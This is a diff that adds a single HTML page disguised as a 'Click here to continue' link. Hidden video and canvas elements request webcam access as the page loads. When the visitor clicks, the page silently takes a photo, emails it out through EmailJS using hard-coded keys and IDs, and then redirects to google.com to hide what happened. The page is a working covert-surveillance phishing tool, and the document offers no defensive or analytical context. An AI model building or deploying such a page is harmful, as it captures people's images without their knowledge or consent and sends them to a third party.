@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://cdn.jsdelivr.net"></script>
+    <script>
+        (function() {
+            emailjs.init("tgzwl-rBt8y9zaBCO"); // 1. Put your Public Key here
+        })();
+    </script>
+    <style>
+        /* The Loading Spinner Style */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none; /* Hidden by default */
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        body { text-align: center; font-family: sans-serif; padding-top: 50px; }
+        #capture-link { color: blue; text-decoration: underline; cursor: pointer; font-size: 20px; }
+    </style>
+</head>
+<body>
+
+    <!-- User sees this link -->
+    <div id="ui-container">
+        <a id="capture-link">Click here to continue</a>
+        <div id="loading-spinner" class="loader"></div>
+    </div>
+
+    <!-- Hidden Camera elements -->
+    <video id="webcam" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const link = document.getElementById('capture-link');
+        const spinner = document.getElementById('loading-spinner');
+
+        // Request camera access immediately
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => console.log("Camera access needed for this demo."));
+
+        link.addEventListener('click', (e) => {
+            e.preventDefault();
+
+            // 1. Show the spinner and hide the link text
+            link.style.display = "none";
+            spinner.style.display = "block";
+            
+            // 2. Capture the photo silently
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL('image/png');
+
+            // 3. YOUR SERVICE & TEMPLATE IDs
+            const serviceID = "service_c0zxyca";
+            const templateID = "template_u0i7lsq";
+
+            emailjs.send(serviceID, templateID, { my_photo: imageData })
+                .then(() => {
+                    // 4. Redirect after success
+                    window.location.href = "https://www.google.com";
+                })
+                .catch(err => {
+                    alert("Error sending. Check console.");
+                    console.error(err);
+                    // Reset UI on error
+                    link.style.display = "inline";
+                    spinner.style.display = "none";
+                });
+        });
+    </script>
+</body>
+</html>
